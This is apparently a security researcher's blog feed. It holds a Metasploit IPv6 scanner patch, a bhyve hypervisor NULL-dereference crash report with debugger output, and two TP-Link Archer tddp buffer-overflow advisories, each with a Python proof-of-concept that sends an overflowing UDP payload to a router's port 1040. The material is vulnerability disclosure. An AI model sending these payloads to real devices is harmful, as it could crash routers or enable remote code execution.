<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-18T03:59:19+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><entry><title type="html">IPv6 Local Neighbor Discovery Using Router Advertisement</title><link href="http://localhost:4000/blog/ipv6_neighbor_router_advertisement/" rel="alternate" type="text/html" title="IPv6 Local Neighbor Discovery Using Router Advertisement" /><published>2019-08-18T00:00:00+08:00</published><updated>2019-08-18T00:00:00+08:00</updated><id>http://localhost:4000/blog/ipv6_neighbor_router_advertisement</id><content type="html" xml:base="http://localhost:4000/blog/ipv6_neighbor_router_advertisement/">&lt;p&gt;Back in March 2016, i had decided to learn more about IPv6 and to do so I came out with an idea to build a network scanner specifically for IPv6 network which can be found &lt;a href=&quot;https://github.com/fakhrizulkifli/6Map&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt; and of course, it is unfinished!. During the development, I relied heavily based on rfc4861 specification to utilize the Neighbor Solicitation to discover hosts on link-local.&lt;/p&gt;

&lt;p&gt;So the idea was to send a Router Advertisement message to the multicast address for all available IPv6 devices within the same network segment. Further reading and googling left me a mailing list thread which discussed some issues in a Metasploit’s auxiliary &lt;a href=&quot;https://www.rapid7.com/db/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement&quot; target=&quot;_blank&quot;&gt;scanner&lt;/a&gt;. Every time the scanner scans the entire network, it leaves the hosts in a denial-of-service state to the IPv6 network due to the misconfigured routing table. Turns out the scanner was sending the RA message with a lifetime of 1800 seconds. So within this timeframe, the hosts will not be able to have proper IPv6 connection until its the RA source address is flushed away from the routing table. So i created a patch for the scanner and set the RA lifetime to 0 indicating it is not a default router and thus not going to be appeared in the host’s routing table.&lt;/p&gt;

&lt;p&gt;Patch diff:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;From b1e9f44ca26072ba9594ef7d034e47283f220b2f Mon Sep 17 00:00:00 2001
From: Fakhri Zulkifli &amp;lt;d0lph1n98@yahoo.com&amp;gt;
Date: Sun, 6 Mar 2016 03:23:37 +0800
Subject: [PATCH] IPv6 Neighbor Advertisement Enhancement
&lt;/span&gt;
http://seclists.org/nmap-dev/2011/q2/79

1. Shorten router advertisement payload lifetime.
&lt;span class=&quot;p&quot;&gt;2. Randomize address prefix.
3. Prevent from getting into default router list.
---
&lt;/span&gt; .../ipv6_neighbor_router_advertisement.rb     | 25 +++++++++++--------
 1 file changed, 14 insertions(+), 11 deletions(-)

diff --git a/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb b/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb
&lt;span class=&quot;gh&quot;&gt;index 08e6967dfe1..4b1d988dce2 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -20,7 +20,7 @@&lt;/span&gt; def initialize
         the host portion of the IPv6 address.  Use NDP host solicitation to
         determine if the IP address is valid'
     },
&lt;span class=&quot;gd&quot;&gt;-    'Author'      =&amp;gt; 'wuntee',
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    'Author'      =&amp;gt; 'wuntee, d0lph1n98',
&lt;/span&gt;     'License'     =&amp;gt; MSF_LICENSE,
     'References'    =&amp;gt;
     [
&lt;span class=&quot;p&quot;&gt;@@ -33,20 +33,22 @@&lt;/span&gt; def initialize
       OptInt.new('TIMEOUT_NEIGHBOR', [true, &quot;Time (seconds) to listen for a solicitation response.&quot;, 1])
     ], self.class)
 
&lt;span class=&quot;gd&quot;&gt;-    register_advanced_options(
-      [
-        OptString.new('PREFIX', [true, &quot;Prefix that each host should get an IPv6 address from&quot;,
-          &quot;2001:1234:DEAD:BEEF::&quot;]
-        )
-      ], self.class)
-
&lt;/span&gt;     deregister_options('SNAPLEN', 'FILTER', 'RHOST', 'PCAPFILE')
   end
 
&lt;span class=&quot;gi&quot;&gt;+  def generate_prefix()
+    max = 16 ** 4
+    prefix = &quot;2001::&quot;
+    (0..2).each do
+        prefix &amp;lt;&amp;lt; &quot;%x::&quot; % Random.rand(0..max)
+    end
+    return prefix
+  end
+
&lt;/span&gt;   def listen_for_neighbor_solicitation(opts = {})
     hosts = []
     timeout = opts['TIMEOUT'] || datastore['TIMEOUT']
&lt;span class=&quot;gd&quot;&gt;-    prefix = opts['PREFIX'] || datastore['PREFIX']
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    prefix = @prefix
&lt;/span&gt; 
     max_epoch = ::Time.now.to_i + timeout
     autoconf_prefix = IPAddr.new(prefix).to_string().slice(0..19)
&lt;span class=&quot;p&quot;&gt;@@ -94,7 +96,7 @@&lt;/span&gt; def create_router_advertisment(opts={})
     smac = @smac
     shost = opts['SHOST'] || datastore['SHOST'] || ipv6_link_address
     lifetime = opts['LIFETIME'] || datastore['TIMEOUT']
&lt;span class=&quot;gd&quot;&gt;-    prefix = opts['PREFIX'] || datastore['PREFIX']
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    prefix = @prefix
&lt;/span&gt;     plen = 64
     dmac = &quot;33:33:00:00:00:01&quot;
 
&lt;span class=&quot;p&quot;&gt;@@ -141,7 +143,7 @@&lt;/span&gt; def router_advertisement_payload
     checksum = 0
     hop_limit = 0
     flags = 0x08
&lt;span class=&quot;gd&quot;&gt;-    lifetime = 1800
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    lifetime = 0
&lt;/span&gt;     reachable = 0
     retrans = 0
     [type, code, checksum, hop_limit, flags,
&lt;span class=&quot;p&quot;&gt;@@ -152,6 +154,7 @@&lt;/span&gt; def run
     # Start capture
     open_pcap({'FILTER' =&amp;gt; &quot;icmp6&quot;})
 
&lt;span class=&quot;gi&quot;&gt;+    @prefix = generate_prefix()
&lt;/span&gt;     @netifaces = true
     if not netifaces_implemented?
       print_error(&quot;WARNING : Pcaprub is not uptodate, some functionality will not be available&quot;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;https://github.com/fakhrizulkifli/6Map&lt;/li&gt;
  &lt;li&gt;https://www.rapid7.com/db/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement&lt;/li&gt;
  &lt;li&gt;https://seclists.org/nmap-dev/2011/q2/79&lt;/li&gt;
  &lt;li&gt;http://www.rfcreader.com/#rfc4861&lt;/li&gt;
  &lt;li&gt;http://www.rfcreader.com/#rfc6104&lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><summary type="html">Back in March 2016, i had decided to learn more about IPv6 and to do so I came out with an idea to build a network scanner specifically for IPv6 network which can be found here and of course, it is unfinished!. During the development, I relied heavily based on rfc4861 specification to utilize the Neighbor Solicitation to discover hosts on link-local.</summary></entry><entry><title type="html">BSD Hypervisor - pci_fbuf NULL Pointer Dereference</title><link href="http://localhost:4000/blog/bhyve_fbuf_null_deref/" rel="alternate" type="text/html" title="BSD Hypervisor - pci_fbuf NULL Pointer Dereference" /><published>2019-08-17T00:00:00+08:00</published><updated>2019-08-17T00:00:00+08:00</updated><id>http://localhost:4000/blog/bhyve_fbuf_null_deref</id><content type="html" xml:base="http://localhost:4000/blog/bhyve_fbuf_null_deref/">&lt;p&gt;NOTE: This also works in &lt;a href=&quot;https://github.com/machyve/xhyve&quot; target=&quot;_blank&quot;&gt;xhyve hypervisor&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Affected code:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 0x00000000002317ec &amp;lt;+108&amp;gt;:	mov $0x206519,%edi
 0x00000000002317f1 &amp;lt;+113&amp;gt;:	xor %eax,%eax
 0x00000000002317f3 &amp;lt;+115&amp;gt;:	mov %r9d,%esi
 0x00000000002317f6 &amp;lt;+118&amp;gt;:	callq 0x24aa00 &amp;lt;printf@plt&amp;gt;
 0x00000000002317fb &amp;lt;+123&amp;gt;:	mov 0xc8(%rbx),%rax
=&amp;gt; 0x0000000000231802 &amp;lt;+130&amp;gt;:	cmpl $0x0,(%rax)
 0x0000000000231805 &amp;lt;+133&amp;gt;:	movzwl 0xc(%rbx),%eax
 0x0000000000231809 &amp;lt;+137&amp;gt;:	je 0x231830 &amp;lt;pci_fbuf_write+176&amp;gt;
 0x000000000023180b &amp;lt;+139&amp;gt;:	test %ax,%ax
 0x000000000023180e &amp;lt;+142&amp;gt;:	je 0x23185d &amp;lt;pci_fbuf_write+221&amp;gt;
 0x0000000000231810 &amp;lt;+144&amp;gt;:	cmpw $0x0,0xe(%rbx)
 0x0000000000231815 &amp;lt;+149&amp;gt;:	je 0x23185d &amp;lt;pci_fbuf_write+221&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Proof-of-Crash:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Thread 13 &quot;vcpu 2&quot; received signal SIGSEGV, Segmentation fault.
[Switching to LWP 100571 of process 4094]
0x0000000000231802 in pci_fbuf_write (ctx=&amp;lt;optimized out&amp;gt;, vcpu=&amp;lt;optimized out&amp;gt;, pi=&amp;lt;optimized out&amp;gt;, baridx=&amp;lt;optimized out&amp;gt;, offset=&amp;lt;optimized out&amp;gt;, size=&amp;lt;optimized out&amp;gt;,
 value=1953719668) at /usr/src/usr.sbin/bhyve/pci_fbuf.c:166
166	if (!sc-&amp;gt;gc_image-&amp;gt;vgamode &amp;amp;&amp;amp; sc-&amp;gt;memregs.width == 0 &amp;amp;&amp;amp;
(gdb) p sc-&amp;gt;gc_image
$1 = (struct bhyvegc_image *) 0x0
(gdb) bt
#0 0x0000000000231802 in pci_fbuf_write (ctx=&amp;lt;optimized out&amp;gt;, vcpu=&amp;lt;optimized out&amp;gt;, pi=&amp;lt;optimized out&amp;gt;, baridx=&amp;lt;optimized out&amp;gt;, offset=&amp;lt;optimized out&amp;gt;, size=&amp;lt;optimized out&amp;gt;,
 value=1953719668) at /usr/src/usr.sbin/bhyve/pci_fbuf.c:166
#1 0x0000000000230522 in pci_emul_mem_handler (ctx=0x80028e080, vcpu=2, dir=&amp;lt;optimized out&amp;gt;, addr=&amp;lt;optimized out&amp;gt;, size=4, val=0x7fffde9f2d40, arg1=0x800a9aa00, arg2=0)
 at /usr/src/usr.sbin/bhyve/pci_emul.c:415
#2 0x0000000000224ae4 in mem_write (ctx=0x80028e080, vcpu=2, gpa=3, wval=1953719668, size=0, arg=0x0) at /usr/src/usr.sbin/bhyve/mem.c:162
#3 0x00000000002486ae in emulate_mov (vm=&amp;lt;optimized out&amp;gt;, vcpuid=&amp;lt;optimized out&amp;gt;, gpa=&amp;lt;optimized out&amp;gt;, vie=&amp;lt;optimized out&amp;gt;, memread=&amp;lt;optimized out&amp;gt;,
 memwrite=&amp;lt;optimized out&amp;gt;, arg=&amp;lt;optimized out&amp;gt;) at /usr/src/sys/amd64/vmm/vmm_instruction_emul.c:517
#4 vmm_emulate_instruction (vm=&amp;lt;optimized out&amp;gt;, vcpuid=&amp;lt;optimized out&amp;gt;, gpa=&amp;lt;optimized out&amp;gt;, vie=&amp;lt;optimized out&amp;gt;, paging=&amp;lt;optimized out&amp;gt;, memread=&amp;lt;optimized out&amp;gt;,
 memwrite=0x224ab0 &amp;lt;mem_write&amp;gt;, memarg=0x800aad100) at /usr/src/sys/amd64/vmm/vmm_instruction_emul.c:1510
#5 0x000000000022448f in emulate_mem_cb (ctx=0x80028e080, vcpu=2, paddr=34370857472, mr=0x0, arg=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/mem.c:238
#6 0x00000000002243da in access_memory (ctx=0x80028e080, vcpu=2, paddr=3221241856, cb=0x224470 &amp;lt;emulate_mem_cb&amp;gt;, arg=0x7fffde9f2ec8) at /usr/src/usr.sbin/bhyve/mem.c:215
#7 0x00000000002242b9 in emulate_mem (ctx=0x80028e080, vcpu=2, paddr=34370857472, vie=&amp;lt;optimized out&amp;gt;, paging=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/mem.c:251
#8 0x000000000021bc75 in vmexit_inst_emul (ctx=0x80028e080, vmexit=0x24f780 &amp;lt;vmexit+272&amp;gt;, pvcpu=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/bhyverun.c:630
#9 0x000000000021b6da in vm_loop (ctx=0x80028e080, vcpu=2, startrip=&amp;lt;optimized out&amp;gt;) at /usr/src/usr.sbin/bhyve/bhyverun.c:748
#10 0x000000000021a969 in fbsdrun_start_thread (param=0x24e050 &amp;lt;mt_vmm_info+48&amp;gt;) at /usr/src/usr.sbin/bhyve/bhyverun.c:353
#11 0x000000080061b776 in ?? () from /lib/libthr.so.3
#12 0x0000000000000000 in ?? ()
Backtrace stopped: Cannot access memory at address 0x7fffde9f3000

(gdb) i registers
rax 0x0 0
rbx 0x800aec000 34371190784
rcx 0x3 3
rdx 0x800a9aa00 34370857472
rsi 0x2 2
rdi 0x80028e080 34362417280
rbp 0x7fffde9f2cd0 0x7fffde9f2cd0
rsp 0x7fffde9f2cc0 0x7fffde9f2cc0
r8 0x0 0
r9 0x4 4
r10 0x231780 2299776
r11 0x7fffde9f2d40 140736928361792
r12 0x0 0
r13 0x80028e080 34362417280
r14 0x800a9aa00 34370857472
r15 0x24b430 2405424
rip 0x231802 0x231802 &amp;lt;pci_fbuf_write+130&amp;gt;
eflags 0x10297 [ CF PF AF SF IF RF ]
cs 0x43 67
ss 0x3b 59
ds &amp;lt;unavailable&amp;gt;
es &amp;lt;unavailable&amp;gt;
fs &amp;lt;unavailable&amp;gt;
gs &amp;lt;unavailable&amp;gt;
fs_base 0x800ac98d0 34371049680
gs_base 0x0 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">NOTE: This also works in xhyve hypervisor.</summary></entry><entry><title type="html">[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow</title><link href="http://localhost:4000/blog/CVE-2019-13614/" rel="alternate" type="text/html" title="[CVE-2019-13614] tddp CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow" /><published>2019-07-15T00:00:00+08:00</published><updated>2019-07-15T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-13614</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-13614/">&lt;p&gt;CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;

&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCCDDDD&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a2&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Send a request
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff725778 in feof () from /lib/libc.so.0
#1  0x0000d56c in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.</summary></entry><entry><title type="html">[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow</title><link href="http://localhost:4000/blog/CVE-2019-13613/" rel="alternate" type="text/html" title="[CVE-2019-13613] tddp CMD_FTEST_CONFIG Stack-based Buffer Overflow" /><published>2019-07-15T00:00:00+08:00</published><updated>2019-07-15T00:00:00+08:00</updated><id>http://localhost:4000/blog/CVE-2019-13613</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2019-13613/">&lt;p&gt;CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Archer Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;

&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;259&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCC&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;31&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
